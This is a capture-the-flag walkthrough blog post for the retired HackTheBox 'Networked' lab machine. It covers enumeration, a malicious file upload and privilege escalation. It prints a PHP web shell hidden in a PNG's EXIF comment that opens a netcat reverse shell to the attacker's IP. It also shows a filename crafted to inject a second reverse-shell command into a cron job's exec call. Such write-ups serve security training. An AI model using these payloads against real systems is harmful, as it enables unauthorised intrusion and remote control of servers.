<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">HacktheBox Networked Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-networked-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-02-19T07:24:09+00:00">February 19, 2020</time><time class="updated" datetime="2025-06-27T12:19:14+00:00">June 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today, we‚Äôre sharing another Hack Challenge Walkthrough box: Networked design by Guly and the machine is part of the retired lab, so you can connect to the machine using your HTB VPN and then start to solve the CTF.</span></p>
<p><span style="color: #000000;">The level of the Lab is set: Beginner to intermediate.</span></p>
<p><span style="color: #000000;">Task: Capture the user.txt and root.txt flags.</span></p>
<h3><span style="color: #800000;">Penetration Methodologies</span></h3>
<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
<ul>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Dirbuster</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
<ul>
<li><span style="color: #000000;">Malicious file upload</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Abusing Exec function via nohup</span></li>
<li><span style="color: #000000;">Abusing Sudo Right</span></li>
</ul>
<h3><span style="color: #800000;">Network Scanning</span></h3>
<p><span style="color: #000000;">As we know the victim‚Äôs machine IP thus, we can start with Nmap scanning to identify the open ports and services running across it.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.146</pre>
<p><span style="color: #000000;">From this scanning result, we found that port 80 is open for HTTP. besides, port 22 is also open for SSH.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ITg0539tzr8/Xkzelda1PkI/AAAAAAAAiwc/fjqhL00eC9slKzOyIQ1msDq9zx9OskX4gCLcBGAsYHQ/s1600/1.png"/></span></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;">As a result, we looked at the victim IP in the web browser and the welcomed web page is shown in the image below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.10.146</pre>
<p><span style="color: #000000;">I read the text given on the web page, but I didn‚Äôt find the message was enough to guess next clue, so I decided to go with the listing of the web directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-L3WH1aTGR4g/XkzemdkAR2I/AAAAAAAAiwo/sgvNIt-BEf88iR-s4UchT_sPi-JxpHFSwCLcBGAsYHQ/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Thus, I choose dirbuster for the directory brute force attack and enter the target URL.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-A-PTK1kNNsc/XkzemTUgoWI/AAAAAAAAiws/GRkXEULYnkkewsaKYoDuXKpwvjheWv1HACLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">As a result I found some php files and directories like<strong> /uploads</strong> and <strong>/backup</strong> as shown in the given image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1nNHTdjgWUo/Xkzem478NnI/AAAAAAAAiww/My5Edtl2Y_IF8jxOy31eO-e8Cl7R3hnjQCLcBGAsYHQ/s1600/4.png"/></span></p>
<p><span style="color: #000000;">So, first I explored the /backup directory and found a backup.tar file on the website.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VZukqh_JI48/XkzenNSO3uI/AAAAAAAAiw0/zm39rHOYm0Ev738qrn-38DPX7m1a32cSwCLcBGAsYHQ/s1600/5.1.png"/></span></p>
<p><span style="color: #000000;">Without wasting a lot of time, we downloaded the file backup.tar in our local machine and extracted the file to analyze what‚Äôs in it.</span></p>
<p><span style="color: #000000;">So, basically, it holds some php files like index.php, lib.php, photos.php, and upload.php. Then we explored upload.php file where this file has been linked to uploads directory to validate uploaded photo via extensions like jpg, png, gif &amp; jpeg.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CAeTHeJa_iA/XkzenUOjLxI/AAAAAAAAiw4/sVG1MglRhwcQoIjEkiMvuMb8qYfelD8ewCLcBGAsYHQ/s1600/5.2.png"/></span></p>
<p><span style="color: #000000;">Then I explored photo.php in the web browser and note that it was the photo gallery where the uploaded photos are available.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CBsWOE3GO2Q/XkzenpN3Z6I/AAAAAAAAiw8/4gKhNQvU6kMAQcPtYlgGWt7ysOhWsDqrgCLcBGAsYHQ/s1600/5.png"/></span></p>
<p><span style="color: #000000;">And when I scanned the /upload.php file in the web browser, I found that the upload parameter allows users to upload any image file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EQ8d57smBAE/Xkzenxoy6bI/AAAAAAAAixA/N8_GZj7o2sQ389dyyVpemUYm_rh6nRX3gCLcBGAsYHQ/s1600/6.png"/></span></p>
<h4><span style="color: #000000;">File Upload Exploit</span></h4>
<p><span style="color: #000000;">An attacker could exploit the image by uploading a backdoor and injecting a malicious payload into it. So, we‚Äôve got the image named ‚Äú1.png‚Äù that I used to inject a malicious payload.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">exiftool -Comment='&lt;?php system("nc 10.10.14.15 1234 -e /bin/bash"); ?&gt;' 1.png</pre>
<p><span style="color: #000000;">After injected the payload with the help of exfil tool, I saved the image as <strong>shell.php.png</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XV3JWA-vLSg/Xkzen-ngVTI/AAAAAAAAixE/FFGuUVE4Ty8Ba2vbC7LZ2ylawuzKrLcyQCLcBGAsYHQ/s1600/7.png"/></span></p>
<p><span style="color: #000000;">When I set all things, I upload the file ‚Äúshell.php.png,‚Äù and as a result, I refresh the gallery successfully with the uploaded file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GER7TZlP2QM/XkzeoD6Ke-I/AAAAAAAAixI/T0Fe1N9cteUgJI9I4zGvGggbIhf0Fbt0QCLcBGAsYHQ/s1600/8.png"/></span></p>
<p><span style="color: #000000;">So, again we browse the http://10.10.10.photos.php file and found the link for our malicious file that we have uploaded.</span></p>
<p><span style="color: #000000;">Now, it was time to execute the backdoor but before that, we need to start netcat listener in the background.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xunVVP3cYs8/XkzeorMvfzI/AAAAAAAAixM/YTOsYJLrTNkBuLT12HjHFqAr5uwAl6H_gCLcBGAsYHQ/s1600/9.png"/></span></p>
<h4><span style="color: #000000;">Reverse Shell &amp; Post-Exploitation</span></h4>
<p><span style="color: #000000;">Then finally! We obtained the victim‚Äôs machine reverse connection via netcat session and a bash shell. I found three files inside the /guly folder as: ‚Äúcheck attack.php‚Äù ‚Äúuser.txt‚Äù ‚Äúcrontab.guly‚Äù where I try to read the user.txt file but couldn‚Äôt read it due to the least permission. üòì</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--Z91FUL9SxA/XkzelKv2fsI/AAAAAAAAiwU/PGiwE226eiA_z626qSkZUALvChl1Cr-gQCLcBGAsYHQ/s1600/10.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">Then I explored crontab.guly where I found a cronjob running in the background to run attack php file every three minutes after that, the attack.php file will check for the malicious content inside <em>/var /www /html/uploads </em>and report it by mail to guly. In addition, the ‚Äúexec‚Äù ¬†function here is used for ‚Äúnohup‚Äù, which stands for No Hungup.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">exec("nohup /bin/rm -f $path$value &gt;/dev/null 2&gt;&amp;1 &amp;")</pre>
<p><span style="color: #000000;">The nohup command runs another program defined as its argument and disregards all signals from SIGHUP (hangup). The given exec function along with nohup will delete the files from the get namechecks function under $path = /var/www/html/uploads/ and $value.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-exwWjpvM2SE/XkzelSONEfI/AAAAAAAAiwY/DGYJUjbWGQYkBnxn9CGTvlkNmrfMLPExgCLcBGAsYHQ/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Therefore, I decided to use the exec function by passing two arguments separated by semi-colon (;) under /var/www/html / uploads. So I use the touch command to build a file that will be our first argument and then continue the second argument separated by; for netcat reverse connection wait for three to get the reverse connection via new netcat session. üòá</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /var/www/html/uploads
touch '; nc 10.10.14.15 8888 -c bash'
nc -lvp 8888</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-SbNZCWmTEo8/Xkzel3JIISI/AAAAAAAAiwg/rDPJD-vxsjwI2A3z2tasN-GYnVt3m2RwACLcBGAsYHQ/s1600/12.png"/></strong></span></p>
<p><span style="color: #000000;">We got a reverse connection of the host machine after three minutes in a new terminal where we had our netcat in listening mode and catch the 1st flag by reading user.txt file.</span></p>
<p><span style="color: #000000;">Now it‚Äôs time to get the root flag too. But we need to raise the root privileges for these, so we search for the user‚Äôs sudo permission.</span></p>
<p><span style="color: #000000;">So, we found user guly can run a program changename.sh from inside /user/local/sbin as root and fill the input which will give a root shell. Just move inside the/root directory and capture the root flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2lBNbmsGxHQ/XkzemM3eMUI/AAAAAAAAiwk/wEw7FDs8YtYGYLp7GVBIFOX3Xh8_g7JDACLcBGAsYHQ/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span>¬†<strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong>¬†<span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><b>Author</b>:¬†Geet Madan is a Certified¬†Ethical Hacker, Researcher and Technical Writer at Hacking Articles on Information Security<b>.¬†</b>Contact¬†<span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/geet-madan/"><b>here</b></a></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
